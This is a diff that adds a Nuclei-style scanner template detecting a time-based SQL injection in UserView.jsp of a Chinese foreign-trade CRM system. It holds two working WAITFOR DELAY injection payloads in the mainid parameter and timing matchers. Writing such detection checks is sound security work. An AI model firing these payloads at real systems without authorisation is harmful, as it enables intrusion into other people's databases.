@@ -1,0 +1,30 @@
+id: weidasoft-userview-jsp-sqli
+info:
+  name: 维达外贸客户关系管理系统 UserView.jsp SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: 维达外贸客户关系管理系统
+  description: |
+    维达外贸客户关系管理系统 UserView.jsp 存在SQL注入漏洞，利用此漏洞可执行延时注入测试。
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/wap/common/admin/UserView.jsp?mainid=1%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--"
+      - "{{BaseURL}}/wap/common/admin/UserView.jsp?mainid=1%27%3BWAITFOR+DELAY+%270%3A0%3A8%27--"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "限制远程"
+          - "限制多重"
+          - "限制随机"
+        part: body
+      - type: dsl
+        dsl:
+          - 'duration_1>=5 && duration_1<=6'
+          - 'duration_2 - duration_1 >2'
+        condition: and
